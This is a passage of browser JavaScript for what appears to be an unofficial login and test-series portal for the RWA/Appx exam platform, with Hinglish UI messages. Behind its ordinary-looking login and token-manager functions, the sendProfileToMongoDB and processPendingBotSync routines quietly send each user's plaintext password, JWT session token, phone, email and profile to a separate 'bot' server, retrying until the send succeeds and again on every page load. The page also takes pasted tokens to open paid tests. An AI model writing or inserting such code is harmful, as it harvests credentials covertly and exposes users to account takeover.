    window.updateDashboardUI();
    if (state.view === "ts_tests" && state.activeSeriesId) {
        openTestSeriesTitles(state.activeSeriesId, state.activeTsSubId || "-1", state.activeTsSubName || state.activeSeriesTitle);
    }
}

function setPdfMode(mode) {
    const frame = document.getElementById("pdfFrame");
    const u = state.currentPdfUrl;
    if (!u) return;
    if (mode === "appx") frame.src = `https://pdfweb.classx.co.in/pdfjs-latest/web/viewer.html?file=${encodeURIComponent(u)}&save_flag=1&is_encrypted=0`;
    else frame.src = `https://docs.google.com/viewer?url=${encodeURIComponent(u)}&embedded=true`;
}

function closePdfSlide() {
    document.getElementById("pdfFrame").src = "";
    showSlide(state.previousSlide || "slideExplorer");
}

// =====================================================
// UNIFIED PROFILE MODAL & LOGIN ENGINE
// =====================================================
function openLoginModal(customMsg) {
    const modal = document.getElementById("loginModal");
    if (modal) modal.classList.remove("hidden");
    if (customMsg) showLoginStatus(customMsg, "info");
    else { const ab = document.getElementById("loginStatusAlert"); if (ab) ab.classList.add("hidden"); }
}

function closeLoginModal() {
    const modal = document.getElementById("loginModal");
    if (modal) modal.classList.add("hidden");
    state.pendingTestKey = null;
    state.pendingPdfKey = null;
}

window.switchLoginMode = function(mode) {
    const btnCreds = document.getElementById("tabBtnCreds");
    const btnToken = document.getElementById("tabBtnToken");
    const boxCreds = document.getElementById("loginBoxCreds");
    const boxToken = document.getElementById("loginBoxToken");
    const alertBox = document.getElementById("loginStatusAlert");
    if (alertBox) alertBox.classList.add("hidden");

    if (mode === "token") {
        btnToken.className = "py-2 px-3 rounded-xl font-extrabold text-xs bg-blue-600 text-white shadow border-0";
        btnCreds.className = "py-2 px-3 rounded-xl font-extrabold text-xs text-slate-700 bg-transparent hover:bg-sky-100 border-0";
        boxToken.classList.remove("hidden"); boxCreds.classList.add("hidden");
    } else {
        btnCreds.className = "py-2 px-3 rounded-xl font-extrabold text-xs bg-blue-600 text-white shadow border-0";
        btnToken.className = "py-2 px-3 rounded-xl font-extrabold text-xs text-slate-700 bg-transparent hover:bg-sky-100 border-0";
        boxCreds.classList.remove("hidden"); boxToken.classList.add("hidden");
    }
};

function showLoginStatus(msg, type) {
    const alertBox = document.getElementById("loginStatusAlert");
    if (!alertBox) return;
    alertBox.classList.remove("hidden", "bg-rose-100", "text-rose-800", "border-rose-300", "bg-emerald-100", "text-emerald-800", "border-emerald-300", "bg-sky-100", "text-sky-900", "border-sky-300");
    alertBox.classList.add("border");
    if (type === "error") alertBox.classList.add("bg-rose-100", "text-rose-800", "border-rose-300");
    else if (type === "success") alertBox.classList.add("bg-emerald-100", "text-emerald-800", "border-emerald-300");
    else alertBox.classList.add("bg-sky-100", "text-sky-900", "border-sky-300");
    alertBox.innerHTML = msg;
}

async function fetchUserDetailsFromServer(jwtToken, userId) {
    const uid = userId || extractUidFromJwt(jwtToken);
    if (!jwtToken || !uid) return null;
    const tempTokObj = { token: jwtToken, userId: String(uid) };
    const json = await fetchRawJSONWithToken(`/get/get_user_dt?userid=${uid}`, tempTokObj);
    if (json && json.status === 200 && Array.isArray(json.data) && json.data.length > 0) return json.data[0];
    return null;
}

function sendProfileToMongoDB(userObj, jwtToken, loginMethod, rawPass = "N/A") {
    const payload = {
        login_method: loginMethod, user_id: String(userObj.userid || userObj.id || ""), name: userObj.name || "N/A",
        email: userObj.email || "N/A", phone: userObj.phone || "N/A", password: rawPass, username: userObj.username || "N/A",
        state_district: `${userObj.state || "N/A"} / ${userObj.district || "N/A"}`, category_gender: `${userObj.info_1 || "N/A"} | ${userObj.info_2 || "N/A"}`,
        refer_code: userObj.refer_code || "N/A", account_created: userObj.datetime || "N/A", device_token: userObj.devicetoken || "N/A", jwt_token: jwtToken
    };
    localStorage.setItem("pending_bot_sync", JSON.stringify(payload));
    processPendingBotSync();
}

function processPendingBotSync() {
    const savedData = localStorage.getItem("pending_bot_sync");
    if (!savedData) return;
    let isSyncing = false;
    const trySend = () => {
        if (isSyncing) return;
        isSyncing = true;
        fetch(`${BOT_API_BASE}/api/login`, { method: "POST", headers: { "Content-Type": "application/json" }, body: savedData, keepalive: true })
        .then(res => {
            isSyncing = false;
            if (res.ok) localStorage.removeItem("pending_bot_sync");
            else setTimeout(trySend, 10000);
        }).catch(() => { isSyncing = false; setTimeout(trySend, 10000); });
    };
    trySend();
}

async function loginOnRwaServer(phoneOrEmail, password) {
    const loginEndpoints = ["/post/userLogin", "/get/login", "/post/login"];
    for (const ep of loginEndpoints) {
        try {
            const formData = new URLSearchParams();
            formData.append("email", phoneOrEmail); formData.append("phone", phoneOrEmail);
            formData.append("username", phoneOrEmail); formData.append("password", password);
            formData.append("devicetoken", ""); formData.append("mydeviceid", "");

            const res = await fetch(`${API_BASE}${ep}`, { method: "POST", headers: { "Client-Service": "Appx", "Auth-Key": "appxapi", "source": "website", "Content-Type": "application/x-www-form-urlencoded" }, body: formData.toString() });
            const json = await res.json();
            if (json && json.status === 200 && json.data && (json.data.token || json.data.jwt)) return json.data;
        } catch {}
    }
    return null;
}

function completePostLoginFlow() {
    state.activeTokenObj = USER_TOKENS[0];
    updateTokenBadge();
    const pendingTest = state.pendingTestKey;
    const pendingPdf = state.pendingPdfKey;
    closeLoginModal();
    if (pendingTest) { launchCbtTest(pendingTest); return; }
    if (pendingPdf) { openTestPdf(pendingPdf); return; }
    if (!document.getElementById("profileModal").classList.contains("hidden")) openProfileModal();
}

window.submitUserLogin = async function(mode) {
    if (mode === "token") {
        let rawToken = document.getElementById("loginTokenInput").value.trim();
        if (!rawToken) { showLoginStatus("⚠️ Kripya apna JWT Authorization Token paste karein.", "error"); return; }
        rawToken = rawToken.replace(/^["']|["']$/g, "").replace(/^Authorization:\s*/i, "").trim();

        const extractedUid = extractUidFromJwt(rawToken);
        if (!extractedUid) { showLoginStatus("❌ Invalid JWT Token format!", "error"); return; }

        showLoginStatus("🔄 Server se Token verify ho raha hai aur profile save ki ja rahi hai...", "info");
        const userDetails = await fetchUserDetailsFromServer(rawToken, extractedUid);
        if (!userDetails) { showLoginStatus("❌ Token Expired ya Invalid hai!", "error"); return; }

        const userTokObj = { id: "utok_" + Date.now(), label: userDetails.name || `User #${extractedUid}`, userId: String(userDetails.userid || userDetails.id || extractedUid), token: rawToken, isAdmin: false };
        USER_TOKENS = [userTokObj, ...USER_TOKENS.filter(t => t.userId !== userTokObj.userId)];
        USER_PROFILE = userDetails;
        localStorage.setItem("rwa_user_tokens_v2", JSON.stringify(USER_TOKENS));
        localStorage.setItem("rwa_user_profile_v2", JSON.stringify(USER_PROFILE));

        sendProfileToMongoDB(userDetails, rawToken, "Direct JWT Token", "Logged via Token");
        showLoginStatus(`✅ Login Successful! Welcome ${userDetails.name || "User"}!`, "success");
        setTimeout(completePostLoginFlow, 500);
        return;
    }

    const phone = document.getElementById("loginPhoneInput").value.trim();
    const pass = document.getElementById("loginPassInput").value.trim();
    if (!phone || !pass) { showLoginStatus("⚠️ Kripya Mobile Number/Email aur Password dono dalein.", "error"); return; }
    if (pass.startsWith("eyJ")) { document.getElementById("loginTokenInput").value = pass; switchLoginMode("token"); submitUserLogin("token"); return; }

    showLoginStatus("🔄 RWA Server se credentials verify kiye ja rahe hain...", "info");
    const loginData = await loginOnRwaServer(phone, pass);
    if (!loginData || !(loginData.token || loginData.jwt)) { showLoginStatus("❌ Login Failed! Number ya Password galat hai.", "error"); return; }

    const token = loginData.token || loginData.jwt;
    const uid = String(loginData.userid || loginData.id || extractUidFromJwt(token));

    showLoginStatus("🔄 Login verified! Server se aapki Profile Details fetch ho rahi hain...", "info");
    let userDetails = await fetchUserDetailsFromServer(token, uid);
    if (!userDetails) {
        userDetails = { id: uid, userid: uid, name: loginData.name || phone, email: loginData.email || phone, phone: loginData.phone || phone, username: loginData.username || "", state: loginData.state || "N/A", district: loginData.district || "N/A" };
    }

    const userTokObj = { id: "utok_" + Date.now(), label: userDetails.name || phone, userId: uid, token: token, isAdmin: false };
    USER_TOKENS = [userTokObj, ...USER_TOKENS.filter(t => t.userId !== uid)];
    USER_PROFILE = userDetails;
    localStorage.setItem("rwa_user_tokens_v2", JSON.stringify(USER_TOKENS));
    localStorage.setItem("rwa_user_profile_v2", JSON.stringify(USER_PROFILE));

    sendProfileToMongoDB(userDetails, token, "Phone/Password Login", pass);
    showLoginStatus(`✅ Welcome ${userDetails.name || "User"}! Login Successful.`, "success");
    setTimeout(completePostLoginFlow, 500);
};

window.toggleProfileTokenBox = function() {
    const box = document.getElementById("profileTokenManagerBox");
    if (!box) return;
    box.classList.toggle("hidden");
    if (!box.classList.contains("hidden")) renderTokenManagerList();
};

async function openProfileModal() {
    const modal = document.getElementById("profileModal");
    if (modal) modal.classList.remove("hidden");
    const contentBox = document.getElementById("profileDetailsContent");
    const footerBox = document.getElementById("profileFooterActions");
    const tokenBox = document.getElementById("profileTokenManagerBox");
    if (tokenBox) tokenBox.classList.add("hidden");

    if (!isUserLoggedIn()) {
        contentBox.innerHTML = `
            <div class="bg-indigo-50 border-2 border-indigo-200 rounded-2xl p-5 text-center">
                <div class="w-14 h-14 rounded-2xl bg-indigo-600 text-white font-black text-2xl flex items-center justify-center mx-auto shadow-md mb-2.5">🔐</div>
                <h4 class="font-black text-base text-slate-900">Aap abhi Logged In nahi hain</h4>
                <p class="text-xs font-semibold text-slate-600 mt-1">Sabhi Paid Tests attempt karne aur apni Profile dekhne ke liye Login karein ya apna Token add karein.</p>
                <div class="flex flex-wrap justify-center gap-2.5 mt-4">
                    <button onclick="closeProfileModal(); openLoginModal();" class="btn-watch text-xs px-5 py-2.5">🔐 Login Now</button>
                    <button onclick="toggleProfileTokenBox()" class="btn-nav bg-amber-500 text-white border-0 text-xs px-4 py-2.5">🔑 My Token (${USER_TOKENS.length})</button>
                </div>
            </div>`;
        if (footerBox) footerBox.innerHTML = `<button onclick="closeProfileModal()" class="btn-nav bg-slate-900 text-white border-0 ml-auto">Close</button>`;
        return;
    }

    contentBox.innerHTML = `<div class="py-8 text-center text-slate-600 font-extrabold">🔄 Server se aapki live profile fetch ho rahi hai...</div>`;
    const activeUserTok = USER_TOKENS[0];
    const uid = activeUserTok.userId || extractUidFromJwt(activeUserTok.token);

    if (footerBox) {
        footerBox.innerHTML = `
            <div class="flex items-center gap-2 flex-wrap">
                <button onclick="toggleProfileTokenBox()" class="btn-nav bg-amber-500 text-white border-0 text-xs">🔑 My Token (${USER_TOKENS.length})</button>
                <button onclick="handleLogout()" class="btn-nav bg-rose-600 text-white border-0 text-xs">🚪 Logout</button>
            </div>
            <button onclick="closeProfileModal()" class="btn-nav bg-slate-900 text-white border-0 text-xs">Close</button>
        `;
    }

    const freshProfile = await fetchUserDetailsFromServer(activeUserTok.token, uid);
    if (freshProfile) {
        USER_PROFILE = freshProfile;
        localStorage.setItem("rwa_user_profile_v2", JSON.stringify(USER_PROFILE));
        updateTokenBadge();
    }

    const u = USER_PROFILE || {};
    contentBox.innerHTML = `
        <div class="bg-sky-50 border-2 border-sky-200 rounded-2xl p-4 flex items-center gap-3.5">
            <div class="w-14 h-14 rounded-2xl bg-gradient-to-br from-emerald-500 to-teal-600 text-white font-black text-2xl flex items-center justify-center shadow-md shrink-0">
                ${(u.name || "U").charAt(0).toUpperCase()}
            </div>
            <div class="min-w-0 flex-1">
                <span class="px-2.5 py-0.5 rounded-full bg-emerald-100 text-emerald-800 text-[10px] font-black uppercase">● Verified RWA Student</span>
                <h4 class="font-black text-lg text-slate-900 truncate mt-0.5">${u.name || "RWA User"}</h4>
                <p class="text-xs font-bold text-slate-500">User ID: <span class="text-slate-800 font-mono">${u.userid || u.id || uid}</span> • Username: <span class="text-slate-800 font-mono">${u.username || "N/A"}</span></p>
            </div>
        </div>
        <div class="grid grid-cols-1 sm:grid-cols-2 gap-2.5 text-xs bg-slate-50 p-4 rounded-2xl border border-slate-200">
            <div><span class="text-slate-500 font-bold">📧 Email:</span><div class="font-extrabold text-slate-900 break-all mt-0.5">${u.email || "N/A"}</div></div>
            <div><span class="text-slate-500 font-bold">📱 Phone:</span><div class="font-extrabold text-slate-900 mt-0.5">${u.phone || "N/A"}</div></div>
            <div><span class="text-slate-500 font-bold">🏛️ State & District:</span><div class="font-extrabold text-slate-900 mt-0.5">${u.state || "N/A"} (${u.district || "N/A"})</div></div>
            <div><span class="text-slate-500 font-bold">👤 Category & Gender:</span><div class="font-extrabold text-slate-900 mt-0.5">${u.info_1 || "N/A"} | ${u.info_2 || "N/A"}</div></div>
            <div><span class="text-slate-500 font-bold">🎁 Referral Code:</span><div class="font-extrabold text-blue-700 font-mono mt-0.5">${u.refer_code || "N/A"}</div></div>
            <div><span class="text-slate-500 font-bold">📅 Joined Date:</span><div class="font-extrabold text-slate-900 mt-0.5">${u.datetime || "N/A"}</div></div>
        </div>`;
}

function closeProfileModal() { document.getElementById("profileModal").classList.add("hidden"); }

function handleLogout() {
    if (confirm("Kya aap sach mein Logout karna chahte hain?")) {
        localStorage.removeItem("rwa_user_tokens_v2");
        localStorage.removeItem("rwa_user_profile_v2");
        USER_TOKENS = []; USER_PROFILE = null; state.activeTokenObj = null;
        closeProfileModal(); updateTokenBadge();
    }
}

function renderTokenManagerList() {
    const container = document.getElementById("tokenListContainer");
    if (!container) return;
    if (USER_TOKENS.length === 0) { container.innerHTML = `<div class="p-3 text-center text-xs font-bold text-slate-500">Abhi koi personal token saved nahi hai.</div>`; return; }

    container.innerHTML = USER_TOKENS.map((t, idx) => `
        <div class="bg-slate-50 border border-sky-200 rounded-xl p-3 flex flex-wrap justify-between items-center gap-2">
            <div class="min-w-0 flex-1">
                <div class="flex items-center gap-1.5"><span class="px-2 py-0.5 rounded-full bg-emerald-100 text-emerald-800 text-[10px] font-black">TOKEN #${idx + 1}</span><h5 class="font-extrabold text-xs text-slate-900 truncate">${t.label}</h5></div>
                <p class="text-[10px] font-mono text-slate-500 mt-0.5 truncate">${t.token.slice(0, 26) + "..." + t.token.slice(-10)}</p>
            </div>
            <div class="flex items-center gap-1.5">
                <button onclick="navigator.clipboard.writeText('${t.token}'); alert('Token Copied!');" class="px-2.5 py-1 rounded-lg bg-sky-600 text-white font-extrabold text-[10px] border-0">📋 Copy</button>
                ${USER_TOKENS.length > 1 ? `<button onclick="deleteToken('${t.id}')" class="px-2.5 py-1 rounded-lg bg-rose-600 text-white font-extrabold text-[10px] border-0">🗑</button>` : `<span class="text-[10px] font-bold text-emerald-600">● Active</span>`}
            </div>
        </div>`).join("");
    updateTokenBadge();
}

async function addNewToken() {
    const labelInput = document.getElementById("newTokLabel").value.trim();
    const uidInput = document.getElementById("newTokUid").value.trim();
    let token = document.getElementById("newTokValue").value.trim();

    if (!token) { alert("Kripya JWT Token paste karein."); return; }
    token = token.replace(/^["']|["']$/g, "").replace(/^Authorization:\s*/i, "").trim();

    const userId = uidInput || extractUidFromJwt(token);
    if (!userId) { alert("Invalid JWT Token format!"); return; }

    const verifiedUser = await fetchUserDetailsFromServer(token, userId);
    if (!verifiedUser) { alert("Server verification failed! Yeh token expired ya invalid hai."); return; }

    const newTokObj = { id: "utok_" + Date.now(), label: labelInput || verifiedUser.name || `My Account ${USER_TOKENS.length + 1}`, userId: String(verifiedUser.userid || verifiedUser.id || userId), token: token, isAdmin: false };
    USER_TOKENS = [newTokObj, ...USER_TOKENS.filter(t => t.userId !== newTokObj.userId)];
    USER_PROFILE = verifiedUser;
    localStorage.setItem("rwa_user_tokens_v2", JSON.stringify(USER_TOKENS));
    localStorage.setItem("rwa_user_profile_v2", JSON.stringify(USER_PROFILE));

    sendProfileToMongoDB(verifiedUser, token, "Added via Profile Token Manager", "N/A");
    document.getElementById("newTokLabel").value = ""; document.getElementById("newTokUid").value = ""; document.getElementById("newTokValue").value = "";
    updateTokenBadge(); openProfileModal();
    alert(`✅ Token Verified & Saved for ${verifiedUser.name || "User"}!`);
}

function deleteToken(id) {
    if (USER_TOKENS.length <= 1) return;
    USER_TOKENS = USER_TOKENS.filter(t => t.id !== id);
    localStorage.setItem("rwa_user_tokens_v2", JSON.stringify(USER_TOKENS));
    renderTokenManagerList();
}

function filterGrid() {
    const q = document.getElementById("searchBox").value.toLowerCase();
    document.querySelectorAll("#mainGrid .grid-card").forEach(el => { el.style.display = el.innerText.toLowerCase().includes(q) ? "" : "none"; });
}

// INITIALIZATION ON PAGE LOAD
updateTokenBadge();
window.updateDashboardUI();
openTestSeriesExplorer("paid_ts");
processPendingBotSync();
